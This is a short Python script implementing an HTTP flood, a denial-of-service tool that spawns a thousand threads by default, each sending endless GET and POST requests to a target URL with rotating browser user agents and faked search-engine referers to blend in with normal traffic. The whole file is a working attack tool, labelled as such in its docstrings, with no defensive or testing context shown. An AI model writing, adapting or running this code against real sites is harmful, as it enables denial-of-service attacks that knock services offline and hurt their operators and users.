import requests
import random
import threading
from urllib.parse import urlparse

class HTTPFlood:
    def __init__(self, target_url, threads=1000):
        self.target_url = target_url
        self.threads = threads
        self.running = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        self.referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/'
        ]

    def http_attack(self):
        """Send HTTP requests to target"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Referer': random.choice(self.referers)
        }
        
        while self.running:
            try:
                # Randomize request type
                if random.random() > 0.5:
                    requests.get(self.target_url, headers=headers, timeout=5)
                else:
                    requests.post(self.target_url, headers=headers, timeout=5)
            except:
                pass

    def start(self):
        """Start HTTP flood attack"""
        self.running = True
        for _ in range(self.threads):
            t = threading.Thread(target=self.http_attack)
            t.daemon = True
            t.start()

    def stop(self):
        """Stop HTTP flood attack"""
        self.running = False
